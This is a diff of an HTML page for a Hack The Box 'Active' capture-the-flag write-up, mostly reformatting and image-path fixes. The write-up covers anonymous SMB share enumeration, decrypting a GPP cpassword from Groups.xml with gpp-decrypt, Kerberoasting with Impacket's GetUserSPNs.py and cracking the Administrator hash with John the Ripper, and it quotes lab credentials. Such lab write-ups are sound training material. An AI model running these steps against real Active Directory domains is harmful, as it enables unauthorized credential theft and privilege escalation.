@@ -20,7 +20,7 @@
     </ul>
 
     <p>I got a lot of ports open</p>
-    <img src="/pngs/HTB/Medium/Cronos/Pasted%20image%2020250609204628.png">
+    <img src="/pngs/HTB/Easy/Active/Pasted%20image%2020250609204628.png">
 
     <p>I started by enumerating the smb shares anonymously.</p>
     <div class="terminal-box">
@@ -47,8 +47,9 @@
 
     <div class="terminal-box">smbclient -N \\\\10.10.10.100\\Replication</div>
 
-    <p>The one that was more important for me it was the 'Groups.xml' file which was under here</p>:
-    <p><code>'\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups'</code>.</p>
+    <p>The one that was more important for me it was the 'Groups.xml' file which was under here :</p>
+    <p><code>\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups</code></p>
+    
     <p>This is the contents of the 'Groups.xml' file.</p>
     <div class="terminal-box">
         <xmp>
@@ -107,7 +108,7 @@
         xa1\x82~\x9en\x1fO\xc6l\x08R#B\xd6[:u,\x1c\x1d'
     </div>
 
-    <p>Then ChatGTP decrypted it to this:</p>
+    <p>ChatGTP decrypted it to this:</p>
 
     <fieldset style="width: fit-content;">
         <legend>Credentials</legend>
@@ -115,9 +116,7 @@
     </fieldset>
 
     <p>A different way to decrypt it is by using this command :</p>
-    <div class="terminal-box">
-    gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
-    </div>
+    <div class="terminal-box">gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</div>
 
     <p>Now I can join and get the user flag via the smb shares.</p>
     <div class="terminal-box">
@@ -137,11 +136,9 @@
 </div>
     
     <h3 class="step-header">3. Privilege Escalation</h3>
-    <p>Since I know it is a Windows machine and I have credentials for a user I started kerberoasting.</p>
+    <p>From enumeration I know it is a Windows machine and I have credentials for a user, I started kerberoasting.</p><br>
     <p>I used the <code>GetUserSPNs.py</code> from Impacket's toolset :</p>
-    <div class="terminal-box">
-    GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.10.10.100
-    </div>
+    <div class="terminal-box">GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.10.10.100</div>
 
     <p>I dumped a Service Principal Name (SPN) tied to administrator, which means I can roast the Administrator's TGS  Kerberos service ticket .</p>
    <div class="terminal-box">
@@ -151,11 +148,9 @@
    </div>
 
    <p>I want to extract the Administrator's hash, and I use the '-request' flag.</p>
-   <div class="terminal-box">
-    GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.10.10.100 -request
-   </div>
+   <div class="terminal-box">GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.10.10.100 -request</div>
    <p>Where I get this response :</p>
-   <img src="/pngs/HTB/Easy/Artic/Pasted%20image%2020250610001134.png">
+   <img src="/pngs/HTB/Easy/Active/Pasted%20image%2020250610001134.png">
    <p>I cracked the hash by using John The Ripper tool :</p>
    <div class="terminal-box">
     ~/john/run$ ./john --wordlist=/usr/share/wordlists/rockyou.txt ~/admin.hash
